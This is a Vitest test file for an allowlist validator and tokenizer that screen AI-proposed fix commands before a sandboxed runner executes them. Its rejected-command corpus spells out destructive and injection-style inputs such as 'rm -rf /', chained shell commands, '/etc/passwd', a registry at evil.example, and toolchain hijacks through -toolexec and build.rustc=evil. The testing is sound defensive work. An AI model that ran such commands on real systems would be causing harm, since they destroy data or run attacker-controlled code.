import { describe, expect, it } from "vitest";
// The runner keeps its own copy of the rules (it must not trust the client);
// these tests assert the two implementations agree.
import {
  tokenizeCommand as runnerTokenize,
  validateArgv as runnerValidate,
} from "../../runner/server.mjs";
import {
  extractFixCommand,
  tokenizeCommand,
  validateCommandArgv,
} from "./fixCommand";

describe("validateCommandArgv", () => {
  const allowed: string[][] = [
    ["npm", "ci", "--no-audit", "--no-fund"],
    ["npm", "run", "test"],
    ["pnpm", "-r", "test"],
    ["yarn", "workspaces", "run", "test"],
    ["bun", "install", "--frozen-lockfile"],
    ["npx", "vitest", "run"],
    ["npx", "mocha"],
    ["python3", "-m", "pip", "install", "-r", "requirements.txt"],
    ["python3", "-m", "pytest", "-q"],
    ["node", "--version"],
    ["python3", "-m", "pip", "install", "-e", "."],
    ["go", "mod", "download"],
    ["go", "test", "./..."],
    ["go", "vet", "./..."],
    ["cargo", "fetch"],
    ["cargo", "test"],
    ["cargo", "--version"],
  ];

  const rejected: string[][] = [
    [],
    ["rm", "-rf", "/"],
    ["sh", "-c", "npm test"],
    ["npm", "publish"],
    ["npm", "install", "--registry=https://evil.example"],
    ["npm", "install", "-g", "left-pad"],
    ["npm", "exec", "whatever"],
    ["curl", "http://example.com"],
    ["node", "-e", "require('child_process')"],
    ["npx", "some-random-package"],
    ["python3", "script.py"],
    ["npm", "install", "foo;bar"],
    ["npm", "install", "../../etc"],
    ["npm", "install", "/etc/passwd"],
    ["git", "push"],
    ["go", "run", "main.go"],
    ["go", "generate", "./..."],
    ["go", "install", "example.com/tool@latest"],
    ["go", "mod", "edit", "-replace=x=y"],
    ["go", "test", "-exec=sh", "./..."],
    ["go", "test", "-toolexec", "evil", "./..."],
    ["go", "test", "../other/..."],
    ["cargo", "install", "ripgrep"],
    ["cargo", "run"],
    ["cargo", "test", "--config", "build.rustc=evil"],
  ];

  for (const argv of allowed) {
    it(`allows ${argv.join(" ")}`, () => {
      expect(validateCommandArgv(argv).ok).toBe(true);
    });
  }
  for (const argv of rejected) {
    it(`rejects ${argv.join(" ") || "(empty)"}`, () => {
      expect(validateCommandArgv(argv).ok).toBe(false);
    });
  }

  it("agrees with the runner's independent copy on the whole corpus", () => {
    for (const argv of [...allowed, ...rejected]) {
      const client = validateCommandArgv(argv).ok;
      const runner = runnerValidate(argv).ok;
      expect(runner, `disagreement on: ${argv.join(" ")}`).toBe(client);
    }
  });
});

describe("tokenizeCommand", () => {
  it("splits a simple command", () => {
    expect(tokenizeCommand("npm install --save-dev chalk")).toEqual([
      "npm",
      "install",
      "--save-dev",
      "chalk",
    ]);
  });

  it("keeps quoted segments as single arguments", () => {
    expect(tokenizeCommand(`npm pkg set scripts.test="mocha --reporter dot"`)).toEqual([
      "npm",
      "pkg",
      "set",
      "scripts.test=mocha --reporter dot",
    ]);
  });

  it("rejects shell metacharacters and unbalanced quotes", () => {
    expect(tokenizeCommand("npm test && rm -rf /")).toBeNull();
    expect(tokenizeCommand('npm run "test')).toBeNull();
    expect(tokenizeCommand("echo $(whoami)")).toBeNull();
  });

  it("matches the runner tokenizer on a corpus", () => {
    const lines = [
      "npm ci --no-audit",
      "npm pkg set scripts.test='mocha -R dot'",
      "pnpm -r test",
      "npm test; rm -rf /",
      "node -e \"require('fs')\"",
    ];
    for (const line of lines) {
      expect(runnerTokenize(line), `disagreement on: ${line}`).toEqual(
        tokenizeCommand(line),
      );
    }
  });
});

describe("extractFixCommand", () => {
  it("parses a JSON reply into an allowlisted argv", () => {
    const result = extractFixCommand(
      'Here you go: {"diagnosis":"Missing dev dependency","fixCommand":"npm install --save-dev mocha"}',
    );
    expect(result.argv).toEqual(["npm", "install", "--save-dev", "mocha"]);
    expect(result.diagnosis).toBe("Missing dev dependency");
    expect(result.giveUp).toBeNull();
  });

  it("returns a wall when the model gives up", () => {
    const result = extractFixCommand(
      '{"diagnosis":"Private registry unreachable","giveUp":true,"wall":"The suite needs a private registry credential that the sandbox does not have."}',
    );
    expect(result.giveUp).toContain("private registry");
    expect(result.argv).toBeNull();
  });

  it("drops unsafe or unparseable proposals with a reason", () => {
    const unsafe = extractFixCommand(
      '{"diagnosis":"nuke it","fixCommand":"rm -rf / && npm test"}',
    );
    expect(unsafe.argv).toBeNull();
    expect(unsafe.rejected).toBeTruthy();

    const garbage = extractFixCommand("I could not figure it out.");
    expect(garbage.argv).toBeNull();
    expect(garbage.rejected).toBeTruthy();
  });
});
